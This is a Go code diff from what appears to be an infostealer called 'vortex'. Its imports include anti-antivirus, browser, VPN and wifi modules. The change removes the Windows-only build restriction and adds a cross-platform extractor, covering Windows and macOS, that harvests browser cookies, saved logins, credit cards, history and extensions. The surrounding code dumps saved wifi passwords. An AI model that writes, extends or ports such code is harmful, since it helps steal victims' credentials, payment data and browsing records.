@@ -1,11 +1,10 @@
-//go:build windows
-
 package main
 
 import (
     "errors"
     "os"
     "path/filepath"
+    "runtime"
     "sync"
     "vortex/antiav"
     "vortex/browser"
@@ -21,6 +20,15 @@ import (
     "vortex/vpn"
     "vortex/wifi"
 )
+
+func newBrowserDataExtractor() BrowserDataExtractor {
+    if runtime.GOOS == "windows" {
+        return &WindowsBrowserDataExtractor{}
+    } else if runtime.GOOS == "darwin" {
+        return &DarwinBrowserDataExtractor{}
+    }
+    return nil
+}
 
 func main() {
 
@@ -80,8 +88,12 @@ func main() {
         }
 
         // Chromium and Gecko based browsers
-        browser.RecursiveChromiumBrowserDump(mainFolder)
-        browser.RecursiveGeckoBrowserDump(mainFolder)
+        browserDataExtractor := newBrowserDataExtractor()
+        cookies, _ := browserDataExtractor.ExtractCookies("")
+        loginData, _ := browserDataExtractor.ExtractLoginData("")
+        creditCards, _ := browserDataExtractor.ExtractCreditCards("")
+        history, _ := browserDataExtractor.ExtractHistory("")
+        extensions, _ := browserDataExtractor.ExtractExtensions("")
 
         // Wifi Passwords
         if err = wifi.DumpWifiPasswords(mainFolder); err != nil {
